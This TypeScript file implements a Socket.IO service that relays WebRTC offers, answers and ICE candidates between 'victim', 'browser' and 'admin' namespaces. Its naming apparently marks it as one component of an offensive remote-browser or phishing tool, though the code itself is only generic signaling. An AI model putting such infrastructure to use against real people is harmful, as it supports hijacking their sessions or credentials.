import type { Server as SocketIOServer, Namespace } from 'socket.io';
import type { RTCSessionDescriptionInit, RTCIceCandidateInit } from '../../shared/types/events.js';
import { logger } from '../utils/logger.js';
import { config } from '../config/config.js';

export class WebRTCSignalingService {
  private io: SocketIOServer;

  constructor(io: SocketIOServer) {
    this.io = io;
    this.setupSignaling();
  }

  /**
   * Setup WebRTC signaling handlers
   */
  private setupSignaling(): void {
    // Victim namespace
    const victimNamespace = this.io.of('/victim');
    this.setupVictimSignaling(victimNamespace);

    // Browser namespace
    const browserNamespace = this.io.of('/browser');
    this.setupBrowserSignaling(browserNamespace);

    // Admin namespace
    const adminNamespace = this.io.of('/admin');
    this.setupAdminSignaling(adminNamespace);
  }

  /**
   * Setup victim namespace signaling
   */
  private setupVictimSignaling(namespace: Namespace): void {
    namespace.on('connection', (socket) => {
      logger.info(`Victim connected: ${socket.id}`);

      // Handle WebRTC offer from victim
      socket.on('webrtc:offer', async (data: { browserId: string; offer: RTCSessionDescriptionInit }) => {
        logger.debug(`Victim ${socket.id} sent offer for browser ${data.browserId}`);
        // Forward offer to browser
        this.io.of('/browser').to(data.browserId).emit('webrtc:offer', {
          viewerId: socket.id,
          offer: data.offer,
        });
      });

      // Handle WebRTC answer from victim
      socket.on('webrtc:answer', async (data: { browserId: string; answer: RTCSessionDescriptionInit }) => {
        logger.debug(`Victim ${socket.id} sent answer for browser ${data.browserId}`);
        // Forward answer to browser
        this.io.of('/browser').to(data.browserId).emit('webrtc:answer', {
          viewerId: socket.id,
          answer: data.answer,
        });
      });

      // Handle ICE candidates from victim
      socket.on('webrtc:candidate', (data: { browserId: string; candidate: RTCIceCandidateInit }) => {
        logger.debug(`Victim ${socket.id} sent ICE candidate for browser ${data.browserId}`);
        // Forward candidate to browser
        this.io.of('/browser').to(data.browserId).emit('webrtc:candidate', {
          viewerId: socket.id,
          candidate: data.candidate,
        });
      });

      socket.on('disconnect', () => {
        logger.info(`Victim disconnected: ${socket.id}`);
      });
    });
  }

  /**
   * Setup browser namespace signaling
   */
  private setupBrowserSignaling(namespace: Namespace): void {
    namespace.on('connection', (socket) => {
      const browserId = socket.handshake.query.browserId as string;
      if (!browserId) {
        logger.warn(`Browser connected without browserId: ${socket.id}`);
        socket.disconnect();
        return;
      }

      // Join browser room
      socket.join(browserId);
      logger.info(`Browser connected: ${socket.id} (browserId: ${browserId})`);

      // Handle WebRTC offer from browser
      socket.on('webrtc:offer', (data: { viewerId: string; offer: RTCSessionDescriptionInit }) => {
        logger.debug(`Browser ${browserId} sent offer for viewer ${data.viewerId}`);
        // Forward offer to victim
        this.io.of('/victim').to(data.viewerId).emit('webrtc:offer', {
          browserId,
          offer: data.offer,
        });
      });

      // Handle WebRTC answer from browser
      socket.on('webrtc:answer', (data: { viewerId: string; answer: RTCSessionDescriptionInit }) => {
        logger.debug(`Browser ${browserId} sent answer for viewer ${data.viewerId}`);
        // Forward answer to victim
        this.io.of('/victim').to(data.viewerId).emit('webrtc:answer', {
          browserId,
          answer: data.answer,
        });
      });

      // Handle ICE candidates from browser
      socket.on('webrtc:candidate', (data: { viewerId: string; candidate: RTCIceCandidateInit }) => {
        logger.debug(`Browser ${browserId} sent ICE candidate for viewer ${data.viewerId}`);
        // Forward candidate to victim
        this.io.of('/victim').to(data.viewerId).emit('webrtc:candidate', {
          browserId,
          candidate: data.candidate,
        });
      });

      socket.on('disconnect', () => {
        logger.info(`Browser disconnected: ${socket.id} (browserId: ${browserId})`);
      });
    });
  }

  /**
   * Setup admin namespace signaling
   */
  private setupAdminSignaling(namespace: Namespace): void {
    namespace.on('connection', (socket) => {
      logger.info(`Admin connected: ${socket.id}`);

      socket.on('disconnect', () => {
        logger.info(`Admin disconnected: ${socket.id}`);
      });
    });
  }

  /**
   * Get ICE servers configuration for WebRTC
   */
  getIceServers(): RTCIceServer[] {
    const servers: RTCIceServer[] = [];

    // Add STUN servers
    for (const stun of config.webrtc.stunServers) {
      servers.push({ urls: stun.urls });
    }

    // Add TURN servers
    if (config.webrtc.turnServers) {
      for (const turn of config.webrtc.turnServers) {
        servers.push({
          urls: turn.urls,
          username: turn.username,
          credential: turn.credential,
        });
      }
    }

    return servers;
  }
}

// Type definition for RTCIceServer (matches WebRTC spec)
interface RTCIceServer {
  urls: string | string[];
  username?: string;
  credential?: string;
}

